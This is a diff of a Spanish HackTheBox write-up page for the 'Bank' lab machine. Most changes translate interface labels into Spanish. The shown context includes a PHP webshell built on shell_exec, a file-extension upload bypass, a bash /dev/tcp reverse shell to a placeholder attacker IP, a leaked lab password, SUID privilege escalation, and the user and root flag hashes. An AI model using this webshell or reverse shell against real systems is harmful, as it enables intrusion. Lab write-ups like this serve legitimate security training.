@@ -4,7 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Bank — HackTheBox Writeup | Brandeiks</title>
-  <meta name="description" content="Writeup de la máquina Bank de HackTheBox — Dificultad: Fácil. DNS local (/etc/hosts) → wfuzz directory discovery → balance-transfer leak → credenciales en texto plano → File Upload bypass (.htb) → RCE → SUID /var/htb/bin/emergency → root.">
+  <meta name="description" content="Writeup de la máquina Bank de HackTheBox — Dificultad: Fácil. DNS local (/etc/hosts) → wfuzz directory discovery → balance-transfer leak → credenciales en texto plano → Subida de Archivos bypass (.htb) → RCE → SUID /var/htb/bin/emergency → root.">
   <meta name="author" content="Brandon Zevallos Pastrana">
   <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%2300ff88' rx='20'/%3E%3Ctext x='50%25' y='50%25' text-anchor='middle' dy='.35em' font-size='70' font-weight='bold' fill='%23050a0e' font-family='monospace'%3EB%3C/text%3E%3C/svg%3E">
   <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;600;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet"/>
@@ -141,7 +141,7 @@
     .val-red    { color: var(--red); }
     .val-facil  { color: #00ffcc; }
 
-    /* ATTACK PATH */
+    /* RUTA DE ATAQUE */
     .attack-path { display: flex; flex-direction: column; gap: 0; }
     .ap-item { display: flex; align-items: flex-start; gap: 0.8rem; padding: 0.5rem 0; }
     .ap-dot { width: 8px; height: 8px; background: var(--green); border-radius: 50%; margin-top: 4px; flex-shrink: 0; box-shadow: 0 0 6px var(--green); }
@@ -311,33 +311,34 @@
 <div class="cursor-ring" id="cursorRing"></div>
 
 <nav>
-  <a href="../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
-  <a href="https://brandeiks.github.io/writeups/" class="nav-back">volver al portafolio</a>
-</nav>
+    <a href="../../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
+    <a href="../../../writeups/index.html" class="nav-back">ANÁLISIS</a>
+    <a href="../../../diccionario/index.html" class="nav-back">DICCIONARIO</a>
+  </nav>
 
 <!-- HERO -->
 <div class="writeup-hero">
   <div class="hero-grid"></div>
   <div class="hero-glow"></div>
   <div class="writeup-hero-content">
-    <p class="breadcrumb">
-      <a href="https://brandeiks.github.io/">brandeiks</a> /
-      <a href="https://brandeiks.github.io/writeups/">writeups</a> /
-      <a href="https://brandeiks.github.io/writeups/">hackthebox</a> /
+    <div class="breadcrumb">
+      <a href="../../../index.html">brandeiks</a> /
+      <a href="../../../writeups/index.html">análisis</a> /
+      <a href="../../../writeups/index.html">hackthebox</a> /
       <span>bank</span>
-    </p>
+    </div>
     <h1 class="writeup-title"><span style="color:var(--green)">Bank</span></h1>
-    <p class="writeup-subtitle">HackTheBox — Linux · /etc/hosts DNS → nmap → wfuzz → balance-transfer leak → File Upload .htb bypass → RCE → SUID emergency LPE</p>
+    <p class="writeup-subtitle">HackTheBox — Linux · /etc/hosts DNS → nmap → wfuzz → fuga en balance-transfer → Bypass de subida de archivos con .htb → RCE → LPE con SUID emergency</p>
     <div class="writeup-meta">
       <span class="meta-badge badge-facil">● FÁCIL</span>
       <span class="meta-badge badge-htb">HACKTHEBOX</span>
       <span class="meta-badge badge-linux">LINUX</span>
       <span class="meta-badge badge-dns">DNS LOCAL</span>
       <span class="meta-badge badge-wfuzz">WFUZZ</span>
-      <span class="meta-badge badge-upload">FILE UPLOAD</span>
+      <span class="meta-badge badge-upload">SUBIDA DE ARCHIVOS</span>
       <span class="meta-badge badge-rce">RCE</span>
       <span class="meta-badge badge-suid">SUID · LPE</span>
-      <span class="meta-date">📅 Abril 2026 · By Brandeiks</span>
+      <span class="meta-date">📅 Abril 2026 · Por Brandeiks</span>
     </div>
   </div>
 </div>
@@ -356,8 +357,8 @@
         <li><a href="#enumeracion">04 · Enumeración Web · wfuzz</a></li>
         <li><a href="#leak">05 · Balance-Transfer · Leak</a></li>
         <li><a href="#acceso">06 · Acceso al Panel</a></li>
-        <li><a href="#upload">07 · File Upload · .htb Bypass</a></li>
-        <li><a href="#rce">08 · RCE · Reverse Shell</a></li>
+        <li><a href="#upload">07 · Subida de archivos · .htb Bypass</a></li>
+        <li><a href="#rce">08 · RCE · Reverse shell</a></li>
         <li><a href="#privesc">09 · Privesc · SUID emergency</a></li>
         <li><a href="#flags">10 · Flags</a></li>
         <li><a href="#referencia">11 · Referencia de Comandos</a></li>
@@ -369,13 +370,13 @@
       <div class="info-row"><span class="info-label">Plataforma</span><span class="info-val val-green">HackTheBox</span></div>
       <div class="info-row"><span class="info-label">OS</span><span class="info-val val-yellow">Linux (Ubuntu)</span></div>
       <div class="info-row"><span class="info-label">Dificultad</span><span class="info-val val-facil">Fácil</span></div>
-      <div class="info-row"><span class="info-label">IP Target</span><span class="info-val" style="color:var(--text)">10.129.3.73</span></div>
+      <div class="info-row"><span class="info-label">IP objetivo</span><span class="info-val" style="color:var(--text)">10.129.3.73</span></div>
       <div class="info-row"><span class="info-label">Web</span><span class="info-val val-cyan">Apache 2.4.7</span></div>
       <div class="info-row"><span class="info-label">Dominio</span><span class="info-val val-cyan">bank.htb</span></div>
       <div class="info-row"><span class="info-label">Estado</span><span class="info-val val-green">● Pwned</span></div>
     </div>
     <div class="sidebar-box">
-      <p class="sidebar-title">// ATTACK PATH</p>
+      <p class="sidebar-title">// RUTA DE ATAQUE</p>
       <div class="attack-path">
         <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>nmap</span> → puertos 22/53/80</div></div>
         <div class="ap-line"></div>
@@ -387,7 +388,7 @@
         <div class="ap-line"></div>
         <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>Credenciales</span> → chris@bank.htb</div></div>
         <div class="ap-line"></div>
-        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>Burp Suite</span> → .htb bypass</div></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>Burp Suite</span> → bypass con .htb</div></div>
         <div class="ap-line"></div>
         <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>shell.htb</span> → RCE www-data</div></div>
         <div class="ap-line"></div>
@@ -446,9 +447,9 @@
           <tr><td>Enum. Web</td><td>wfuzz -c -hc=404 -t 200 -w big.txt http://bank.htb/FUZZ.php</td><td>/balance-transfer, /support, /uploads</td></tr>
           <tr><td>Leak</td><td>curl + awk + grep → archivo con ERR ENCRYPT FAILED</td><td>chris@bank.htb : !!##HTBB4nkP4ssw0rd!##</td></tr>
           <tr><td>Acceso</td><td>Login en bank.htb/login.php</td><td>Panel bancario autenticado como Christos Christopoulos</td></tr>
-          <tr><td>File Upload</td><td>Burp Suite → cambiar extensión .php → .htb</td><td>shell.htb subida a /uploads/</td></tr>
+          <tr><td>Subida de archivos</td><td>Burp Suite → cambiar extensión .php → .htb</td><td>shell.htb subida a /uploads/</td></tr>
           <tr><td>RCE</td><td>bank.htb/uploads/shell.htb?cmd=whoami</td><td>www-data</td></tr>
-          <tr><td>Reverse Shell</td><td>bash -i &gt;&amp; /dev/tcp/IP/443 0&gt;&amp;1 (URL-encoded)</td><td>Shell interactiva como www-data</td></tr>
+          <tr><td>Reverse shell</td><td>bash -i &gt;&amp; /dev/tcp/IP/443 0&gt;&amp;1 (URL-encoded)</td><td>Shell interactiva como www-data</td></tr>
           <tr><td>Privesc</td><td>find / -perm -4000 -type f → /var/htb/bin/emergency</td><td>SUID root → ejecución como root</td></tr>
           <tr><td>Root</td><td>/var/htb/bin/emergency</td><td>root.txt obtenido</td></tr>
         </tbody>
@@ -496,7 +497,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="nmap -p- -sV -sC -sS -n -Pn --min-rate=5000 10.129.3.73">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">RECONOCIMIENTO</span>
         <div><span class="prompt">$ </span><span class="cmd">nmap <span class="flag">-p-</span> <span class="flag">-sV</span> <span class="flag">-sC</span> <span class="flag">-sS</span> <span class="flag">-n</span> <span class="flag">-Pn</span> <span class="flag">--min-rate=5000</span> <span class="arg">10.129.3.73</span></span></div>
       </div>
@@ -553,7 +554,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="ping bank.htb -c 3">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">VERIFICACIÓN DNS</span>
         <div><span class="prompt">$ </span><span class="cmd">ping <span class="arg">bank.htb</span> <span class="flag">-c</span> <span class="arg">3</span></span></div>
       </div>
@@ -602,7 +603,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sudo nano /etc/hosts">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">DNS LOCAL</span>
         <div><span class="prompt">$ </span><span class="cmd">sudo nano <span class="arg">/etc/hosts</span></span></div>
       </div>
@@ -632,7 +633,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="ping bank.htb -c 3">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">VERIFICACIÓN</span>
         <div><span class="prompt">$ </span><span class="cmd">ping <span class="arg">bank.htb</span> <span class="flag">-c</span> <span class="arg">3</span></span></div>
       </div>
@@ -697,7 +698,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="wfuzz -c -hc=302 -t 200 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt http://bank.htb/FUZZ.php">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">FUZZING · ARCHIVOS PHP</span>
         <div><span class="prompt">$ </span><span class="cmd">wfuzz <span class="flag">-c</span> <span class="flag">-hc=302</span> <span class="flag">-t 200</span> <span class="flag">-w</span> <span class="arg">/usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt</span> <span class="arg">http://bank.htb/FUZZ.php</span></span></div>
       </div>
@@ -730,7 +731,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="wfuzz -c -hc=302 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://bank.htb/FUZZ">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">FUZZING · DIRECTORIOS</span>
         <div><span class="prompt">$ </span><span class="cmd">wfuzz <span class="flag">-c</span> <span class="flag">-hc=302</span> <span class="flag">-t 200</span> <span class="flag">-w</span> <span class="arg">/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span> <span class="arg">http://bank.htb/FUZZ</span></span></div>
       </div>
@@ -811,7 +812,7 @@
       </div>
 
       <div class="cmd-block" data-cmd='curl http://bank.htb/balance-transfer/ | awk '"'"'{print$6 " ---> " $10}'"'"' | tr -d '"'"'"'"'"' | grep "align=right>2"'>
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">FILTRADO</span>
         <div><span class="prompt">$ </span><span class="cmd">curl <span class="arg">http://bank.htb/balance-transfer/</span> | awk <span class="arg">'{print$6 " ---> " $10}'</span> | tr <span class="flag">-d</span> <span class="arg">'"'</span> | grep <span class="arg">"align=right&gt;2"</span></span></div>
       </div>
@@ -836,7 +837,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="curl http://bank.htb/balance-transfer/68576f20e9732f1b2edc4df5b8533230.acc">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">LEER ARCHIVO</span>
         <div><span class="prompt">$ </span><span class="cmd">curl <span class="arg">http://bank.htb/balance-transfer/68576f20e9732f1b2edc4df5b8533230.acc</span></span></div>
       </div>
@@ -914,17 +915,17 @@
           La sección <strong>Support → My Tickets</strong> permite adjuntar archivos a un
           ticket de soporte. Si el servidor no valida correctamente el tipo de archivo subido,
           podríamos subir una <strong>webshell PHP</strong> y obtener ejecución remota de
-          comandos (RCE). Esta es la técnica conocida como <strong>Arbitrary File Upload</strong>.
+          comandos (RCE). Esta es la técnica conocida como <strong>Arbitrary Subida de archivos</strong>.
         </p>
       </div>
     </div>
 
     <hr class="divider">
 
-    <!-- ===================== 07 FILE UPLOAD ===================== -->
+    <!-- ===================== 07 SUBIDA DE ARCHIVOS ===================== -->
     <div class="section" id="upload">
       <p class="section-label">// 07</p>
-      <h2 class="section-title">File Upload · Bypass con extensión .htb</h2>
+      <h2 class="section-title">Subida de archivos · Bypass con extensión .htb</h2>
       <div class="section-line"></div>
 
       <div class="step-marker">
@@ -946,7 +947,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="echo '<?php echo &quot;<pre>&quot; . shell_exec($_REQUEST[&quot;cmd&quot;]) . &quot;</pre>&quot;; ?>' > shell.php">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">CREAR WEBSHELL</span>
         <div><span class="prompt">$ </span><span class="cmd">nano <span class="arg">shell.php</span></span></div>
         <div><span class="comment"># Contenido del archivo:</span></div>
@@ -1016,7 +1017,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="mv shell.php shell.htb && ls">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">RENOMBRAR</span>
         <div><span class="prompt">$ </span><span class="cmd">mv <span class="arg">shell.php</span> <span class="arg">shell.htb</span> &amp;&amp; ls</span></div>
       </div>
@@ -1042,7 +1043,7 @@
     <!-- ===================== 08 RCE ===================== -->
     <div class="section" id="rce">
       <p class="section-label">// 08</p>
-      <h2 class="section-title">RCE · Reverse Shell</h2>
+      <h2 class="section-title">RCE · Reverse shell</h2>
       <div class="section-line"></div>
 
       <div class="step-marker">
@@ -1060,7 +1061,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="curl http://bank.htb/uploads/shell.htb?cmd=whoami">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">VERIFICAR RCE</span>
         <div><span class="comment"># URL en el navegador:</span></div>
         <div><span class="arg">http://bank.htb/uploads/shell.htb?cmd=whoami</span></div>
@@ -1098,7 +1099,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="nc -lvnp 443">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">LISTENER</span>
         <div><span class="prompt">$ </span><span class="cmd">nc <span class="flag">-lvnp</span> <span class="arg">443</span></span></div>
       </div>
@@ -1130,7 +1131,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="http://bank.htb/uploads/shell.htb?cmd=bash -c 'bash -i >& /dev/tcp/TU_IP/443 0>&1'">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">REVERSE SHELL · URL</span>
         <div><span class="comment"># URL en el navegador (con encoding):</span></div>
         <div><span class="arg">http://bank.htb/uploads/shell.htb?cmd=bash -c "bash -i %3E%26 /dev/tcp/<span class="o-red">TU_IP</span>/443 0%3E%261"</span></div>
@@ -1156,7 +1157,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="cd home && ls && cd chris && ls && cat user.txt">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">ENUM SISTEMA</span>
         <div><span class="prompt">www-data@bank:/$ </span><span class="cmd">cd home && ls</span></div>
       </div>
@@ -1177,7 +1178,7 @@
     <!-- ===================== 09 PRIVESC ===================== -->
     <div class="section" id="privesc">
       <p class="section-label">// 09</p>
-      <h2 class="section-title">Escalada de Privilegios · SUID emergency</h2>
+      <h2 class="section-title">Escalada de privilegios · SUID emergency</h2>
       <div class="section-line"></div>
 
       <div class="step-marker">
@@ -1206,7 +1207,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="find / -perm -4000 -type f 2>/dev/null">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">BUSCAR SUID</span>
         <div><span class="prompt">www-data@bank:/$ </span><span class="cmd">find <span class="arg">/</span> <span class="flag">-perm -4000</span> <span class="flag">-type f</span> <span class="arg">2&gt;/dev/null</span></span></div>
       </div>
@@ -1249,7 +1250,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="ls -l /var/htb/bin/emergency">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">VERIFICAR PERMISOS</span>
         <div><span class="prompt">www-data@bank:/$ </span><span class="cmd">ls <span class="flag">-l</span> <span class="arg">//var/htb/bin/emergency</span></span></div>
       </div>
@@ -1271,7 +1272,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="/var/htb/bin/emergency">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">PRIVESC · SUID</span>
         <div><span class="prompt">www-data@bank:/$ </span><span class="cmd"><span class="arg">/var/htb/bin/emergency</span></span></div>
       </div>
@@ -1306,12 +1307,12 @@
 
       <div class="step-marker">
         <div class="step-num">21</div>
-        <span class="step-title">USER FLAG</span>
+        <span class="step-title">BANDERA DE USUARIO</span>
       </div>
 
       <div class="cmd-block" data-cmd="cat /home/chris/user.txt">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
-        <span class="cmd-label">USER FLAG</span>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">BANDERA DE USUARIO</span>
         <div><span class="prompt">www-data@bank:/home/chris$ </span><span class="cmd">cat <span class="arg">/home/chris/user.txt</span></span></div>
       </div>
 
@@ -1321,12 +1322,12 @@
 
       <div class="step-marker">
         <div class="step-num">22</div>
-        <span class="step-title">ROOT FLAG</span>
+        <span class="step-title">BANDERA DE ROOT</span>
       </div>
 
       <div class="cmd-block" data-cmd="cat /root/root.txt">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
-        <span class="cmd-label">ROOT FLAG</span>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">BANDERA DE ROOT</span>
         <div><span class="prompt-root">root@bank:/# </span><span class="cmd">cat <span class="arg">/root/root.txt</span></span></div>
       </div>
 
@@ -1336,11 +1337,11 @@
 
       <div class="cred-box">
         <div class="cred-item">
-          <div class="cred-label">USER FLAG</div>
+          <div class="cred-label">BANDERA DE USUARIO</div>
           <div class="cred-val">6be0e40ae7bbd0d66f245e0a3ecff470</div>
         </div>
         <div class="cred-item">
-          <div class="cred-label">ROOT FLAG</div>
+          <div class="cred-label">BANDERA DE ROOT</div>
           <div class="cred-val" style="color:var(--red)">dc7357216742fe3bbca0b156eb55bdd4</div>
         </div>
       </div>
@@ -1470,14 +1471,14 @@
         </div>
 
         <div class="glos-card">
-          <div class="glos-term">Credenciales en Texto Plano — Clear Text Credentials</div>
+          <div class="glos-term">Credenciales en Texto Plano — Clear Text Credenciales</div>
           <div class="glos-def">
             Almacenar contraseñas en <strong>texto plano</strong> (sin cifrar ni hashear) en archivos accesibles es una práctica gravemente insegura. En este caso, el proceso de cifrado falló y dejó el archivo <code>.acc</code> con la contraseña directamente legible. La práctica correcta incluye: usar <strong>hashes modernos</strong> (bcrypt, Argon2, scrypt) para contraseñas, implementar cifrado simétrico con llaves almacenadas de forma segura, y nunca exponer archivos de datos sensibles en directorios públicos del webroot. Una capa adicional de defensa hubiera sido requerir autenticación para acceder a <code>/balance-transfer/</code>.
           </div>
         </div>
 
         <div class="glos-card">
-          <div class="glos-term">File Upload Bypass — Evasión de Filtros de Subida</div>
+          <div class="glos-term">Subida de archivos Bypass — Evasión de Filtros de Subida</div>
           <div class="glos-def">
             Las <strong>vulnerabilidades de subida de archivos</strong> ocurren cuando un servidor permite subir archivos sin validar correctamente su tipo. Los filtros pueden estar en el <strong>cliente</strong> (JavaScript, fácilmente evadible con Burp) o en el <strong>servidor</strong> (validación de MIME type, extensión, magic bytes). En este caso, el servidor filtraba extensiones comunes (<code>.php</code>) pero tenía una backdoor de debugging: la extensión <code>.htb</code> configurada para ejecutarse como PHP. Burp Suite permite interceptar y modificar cualquier petición antes de que llegue al servidor, incluyendo el nombre del archivo y su Content-Type.
           </div>
@@ -1491,7 +1492,7 @@
         </div>
 
         <div class="glos-card">
-          <div class="glos-term">Reverse Shell — bash -i &gt;&amp; /dev/tcp</div>
+          <div class="glos-term">Reverse shell — bash -i &gt;&amp; /dev/tcp</div>
           <div class="glos-def">
             Una <strong>reverse shell</strong> es una técnica donde el servidor víctima inicia la conexión hacia el atacante (inverso a una bind shell). Esto elude firewalls que bloquean conexiones entrantes pero permiten las salientes. El mecanismo <code>/dev/tcp/IP/PUERTO</code> es una función especial de <strong>Bash</strong> que abre un socket TCP. Combinado con <code>bash -i</code> (bash interactivo) y la redirección <code>&gt;&amp; ... 0&gt;&amp;1</code> (redirigir stdout, stderr y stdin al socket), obtenemos una shell completa. El atacante escucha con <strong>netcat</strong> (<code>nc -lvnp PUERTO</code>) y recibe la conexión entrante del servidor comprometido.
           </div>
@@ -1533,9 +1534,9 @@
 
 <!-- FOOTER -->
 <footer>
-  <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup personal · HackTheBox</p>
-  <p>Built with <span>kali linux</span> &amp; <span>❤</span></p>
-</footer>
+    <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Análisis de Bank · HackTheBox</p>
+    <p>Hecho con <span>kali linux</span> &amp; <span>❤</span></p>
+  </footer>
 
 <script>
   // ACTIVE TOC
